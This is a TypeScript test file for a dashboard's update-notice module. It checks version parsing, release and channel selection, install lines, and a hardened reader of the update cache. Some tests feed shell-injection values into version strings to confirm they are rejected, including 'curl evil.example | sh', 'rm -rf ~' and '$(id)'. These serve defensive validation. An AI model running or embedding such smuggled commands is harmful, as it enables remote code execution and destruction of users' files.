/**
 * update-notice.test — the dashboard's mirror of the launcher's update
 * check (dashboard.md §4.25 *A newer release*; packaging.md §11.5): which
 * release to name, the channel, the install line, and the reader of the
 * cache the launcher wrote (O_NOFOLLOW, a regular file of this user, closed
 * to group and other writes, under 256 KiB, well-formed). Equality with the
 * launcher itself is tests/stack/update-notice-parity.test.ts.
 *
 * Pure (a temp folder for the reader): nothing is enforced, so no axis is
 * in play. Mandu-new test.
 */
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { chmodSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { pathToFileURL } from "node:url";

import {
  cacheFresh, compareVersions, configuredUpdateCheck, dashboardLayout, installLine, layoutOf, MAX_CACHE_BYTES, newerRelease, parseVersion,
  readUpdateCache, UpdateCacheReader, updateChannel, updateCheckSetting, type UpdateCache,
} from "../../src/update-notice.js";
import { readConfigText } from "../../src/config-axes.js";

const tmp = mkdtempSync(join(tmpdir(), "mandu-update-notice-"));
after(() => rmSync(tmp, { recursive: true, force: true }));

const NOW = Date.UTC(2026, 9, 22, 12, 0, 0);
const CACHE: UpdateCache = { v: 1, checkedAt: NOW - 3_600_000, ok: true, releases: [{ version: "0.2.0-beta.9", security: true }], releasesAt: NOW - 3_600_000 };
let n = 0;
/** A cache file with `body` (an object as JSON, or raw text), mode 0600. */
function file(body: unknown, mode = 0o600): string {
  const p = join(tmp, `c${n++}.json`);
  writeFileSync(p, typeof body === "string" ? body : JSON.stringify(body), { mode });
  chmodSync(p, mode);
  return p;
}
const v = (s: string) => {
  const p = parseVersion(s);
  assert.ok(p, s);
  return p;
};

test("versions sort by semver precedence, prereleases included", () => {
  const order = ["0.1.9", "0.2.0-alpha", "0.2.0-beta", "0.2.0-beta.2", "0.2.0-beta.3", "0.2.0-beta.10", "0.2.0-beta.x", "0.2.0-rc.1", "0.2.0", "0.2.1", "1.0.0"];
  for (let i = 0; i < order.length - 1; i++) {
    assert.equal(compareVersions(v(order[i]!), v(order[i + 1]!)), -1, `${order[i]} < ${order[i + 1]}`);
    assert.equal(compareVersions(v(order[i + 1]!), v(order[i]!)), 1);
  }
  assert.equal(compareVersions(v("v1.2.3+build.5"), v("1.2.3")), 0, "a leading v and build metadata do not count");
  for (const bad of ["", "1.2", "01.2.3", "1.2.3-", "1.2.3 ; rm -rf ~", "latest", "1.2.3\n4"]) assert.equal(parseVersion(bad), null, JSON.stringify(bad));
});

test("a release user is never offered a prerelease; a prerelease user hears of both", () => {
  const releases = [{ version: "1.1.0-beta.1", security: false }, { version: "1.0.1", security: false }];
  assert.deepEqual(newerRelease("1.0.0", releases), { newest: "1.0.1", security: false });
  assert.deepEqual(newerRelease("1.0.0", [{ version: "1.1.0-beta.1", security: true }]), null);
  assert.deepEqual(newerRelease("1.1.0-alpha", releases), { newest: "1.1.0-beta.1", security: false });
  assert.deepEqual(newerRelease("1.0.1", releases), null, "the newest: nothing to say");
  assert.equal(newerRelease("unknown", releases), null, "a version that is not semver: nothing to compare");
});

test("security when any release after the running one, up to the newest, carries the marker", () => {
  const releases = [{ version: "0.2.0-beta.6", security: true }, { version: "0.2.0-beta.8", security: true }, { version: "0.2.0-beta.9", security: false }];
  assert.deepEqual(newerRelease("0.2.0-beta.7", releases), { newest: "0.2.0-beta.9", security: true });
  assert.deepEqual(newerRelease("0.2.0-beta.8", releases), { newest: "0.2.0-beta.9", security: false }, "the one you run fixed it already");
});

test("the channel: npm for an installed package, the release's install.sh for the installer's and for a checkout", () => {
  const none = () => false;
  const marked = (p: string) => p === "/pkg/.mandu-installer";
  assert.equal(updateChannel({ mode: "installed", pkgRoot: "/pkg" }, none), "npm");
  assert.equal(updateChannel({ mode: "installed", pkgRoot: "/pkg" }, marked), "release");
  assert.equal(updateChannel({ mode: "dev", pkgRoot: "/pkg" }, none), "release");
  assert.equal(installLine("0.2.0-beta.9", "npm"), "npm install -g @mandusec/mandu@0.2.0-beta.9");
  assert.equal(installLine("0.2.0-beta.9", "release"), "curl -fsSL https://github.com/ManduSec/mandu/releases/download/v0.2.0-beta.9/install.sh | sh");
});

test("the layout: a bundle in an installed dist/ is installed; a checkout's build, the source and MANDU_LAYOUT=dev are not", () => {
  const url = (p: string) => pathToFileURL(p).href;
  const none = () => false;
  assert.deepEqual(layoutOf(url("/pkg/dist/dashboard.mjs"), {}, none), { mode: "installed", pkgRoot: "/pkg" });
  assert.deepEqual(layoutOf(url("/repo/launcher/dist/dashboard.mjs"), {}, (p) => p === "/repo/launcher/src/run.ts"), { mode: "dev", pkgRoot: "/repo/launcher" });
  assert.deepEqual(layoutOf(url("/repo/dashboard/src/update-notice.ts"), {}, none), { mode: "dev", pkgRoot: "/repo/dashboard" });
  assert.equal(layoutOf(url("/pkg/dist/dashboard.mjs"), { MANDU_LAYOUT: "dev" }, none).mode, "dev");
  assert.equal(layoutOf(url("/pkg/dist/dashboard.mjs"), { MANDU_DEV_REPO: "/x" }, none).mode, "dev");
  assert.equal(layoutOf(url("/repo/dashboard/src/update-notice.ts"), { MANDU_LAYOUT: "installed" }, none).mode, "installed");
});

test("whether the launcher checks: update-check = false is off, = true on; unset, an installed package checks and a source checkout does not", () => {
  const cases: Array<[string | null, "installed" | "dev", "on" | "off" | "source"]> = [
    ["update-check = false\n", "installed", "off"],
    ["update-check = false\n", "dev", "off"],
    ["update-check = true\n", "installed", "on"],
    ["update-check = true\n", "dev", "on"],
    ["mode = \"secrets\"\n", "installed", "on"],
    ["mode = \"secrets\"\n", "dev", "source"],
    [null, "installed", "on"],
    [null, "dev", "source"],
  ];
  for (const [text, mode, want] of cases) assert.equal(updateCheckSetting(configuredUpdateCheck(text), mode), want, `${JSON.stringify(text)} ${mode}`);
});

test("the update-check key: the launcher's bool coercion (only true or \"true\" is on), comments and sections as its reader takes them", () => {
  assert.equal(configuredUpdateCheck(null), null, "no file: unset");
  assert.equal(configuredUpdateCheck(""), null);
  assert.equal(configuredUpdateCheck("# update-check = false\n"), null, "the template's commented line is unset");
  assert.equal(configuredUpdateCheck("update-check = \"true\""), true);
  assert.equal(configuredUpdateCheck("update-check = true # yes"), true, "an inline comment");
  for (const v of ["\"yes\"", "1", "0", "off", "\"\""]) assert.equal(configuredUpdateCheck(`update-check = ${v}`), false, `${v}: not true is off, as the launcher coerces`);
  assert.equal(configuredUpdateCheck("update-check = true\nupdate-check = false\n"), false, "the last line wins");
  assert.equal(configuredUpdateCheck("[ui]\nupdate-check = false\n"), false, "sections flatten, as the launcher's reader does");
  assert.equal(configuredUpdateCheck("no-update-check = false\n"), null, "another key");
});

test("the config text: absent or unreadable counts as unset; the dashboard's own layout runs from source here", () => {
  const home = join(tmp, "mandu-home");
  mkdirSync(home, { recursive: true });
  assert.equal(readConfigText({ MANDU_HOME: home }), null, "no config.toml");
  assert.equal(readConfigText({}), null, "no home at all");
  mkdirSync(join(home, "config.toml"));
  assert.equal(readConfigText({ MANDU_HOME: home }), null, "a directory where the file would be: unreadable, unset");
  rmSync(join(home, "config.toml"), { recursive: true });
  writeFileSync(join(home, "config.toml"), "update-check = false\n");
  assert.equal(configuredUpdateCheck(readConfigText({ MANDU_HOME: home })), false);
  assert.equal(dashboardLayout({}), "dev", "this test runs the source");
  assert.equal(dashboardLayout({ MANDU_LAYOUT: "installed" }), "installed");
});

test("a version holding shell text never reaches the install line: the cache reader refuses the file", () => {
  for (const version of ["1.0.1; curl evil.example | sh", "1.0.1 && rm -rf ~", "$(id)", "`id`", "1.0.1|sh"]) {
    assert.equal(readUpdateCache(file({ ...CACHE, releases: [{ version, security: true }] })), null, version);
  }
});

test("the reader takes a well-formed cache of this user, 0600", () => {
  assert.deepEqual(readUpdateCache(file(CACHE)), CACHE);
});

test("the reader refuses a symlink, a group- or other-writable file, another user's, an oversized one, bad JSON, a wrong shape", () => {
  const good = file(CACHE);
  const link = join(tmp, "link.json");
  symlinkSync(good, link);
  assert.equal(readUpdateCache(link), null, "a symlink (O_NOFOLLOW)");
  assert.equal(readUpdateCache(file(CACHE, 0o620)), null, "group-writable");
  assert.equal(readUpdateCache(file(CACHE, 0o602)), null, "other-writable");
  assert.equal(readUpdateCache(good, (process.getuid?.() ?? 0) + 1), null, "another user's");
  assert.equal(readUpdateCache(file(" ".repeat(MAX_CACHE_BYTES) + JSON.stringify(CACHE))), null, "over 256 KiB");
  assert.equal(readUpdateCache(file("{not json")), null, "bad JSON");
  assert.equal(readUpdateCache(file({ ...CACHE, v: 2 })), null, "another cache version");
  assert.equal(readUpdateCache(file({ ...CACHE, releasesAt: "yesterday" })), null, "a time that is not a number");
  assert.equal(readUpdateCache(join(tmp, "absent.json")), null, "absent");
  const dir = join(tmp, "a-dir.json");
  mkdirSync(dir);
  assert.equal(readUpdateCache(dir), null, "not a regular file");
});

test("a checkedAt in the future is not fresh; a day-old one is not either", () => {
  assert.equal(cacheFresh(CACHE, NOW), true);
  assert.equal(cacheFresh({ ...CACHE, checkedAt: NOW + 86_400_000 }, NOW), false, "from the future");
  assert.equal(cacheFresh({ ...CACHE, checkedAt: NOW - 86_400_000 }, NOW), false, "a day old");
});

test("Home's poll reads the file again only when it changed: one stat otherwise", () => {
  const p = join(tmp, "polled.json");
  writeFileSync(p, JSON.stringify(CACHE), { mode: 0o600 });
  let reads = 0;
  const reader = new UpdateCacheReader(p, (path) => { reads++; return readUpdateCache(path); });
  assert.deepEqual(reader.get(), CACHE);
  assert.deepEqual(reader.get(), CACHE);
  assert.equal(reads, 1, "unchanged: not read again");
  const later = { ...CACHE, releases: [{ version: "0.2.0-beta.10", security: false }] };
  writeFileSync(p, JSON.stringify(later), { mode: 0o600 });
  utimesSync(p, new Date(NOW + 60_000), new Date(NOW + 60_000));
  assert.deepEqual(reader.get(), later);
  assert.equal(reads, 2);
  chmodSync(p, 0o660);
  assert.equal(reader.get(), null, "made group-writable: read again, and refused");
  rmSync(p);
  assert.equal(reader.get(), null, "removed");
  assert.equal(reads, 3, "an absent file is not read");
});
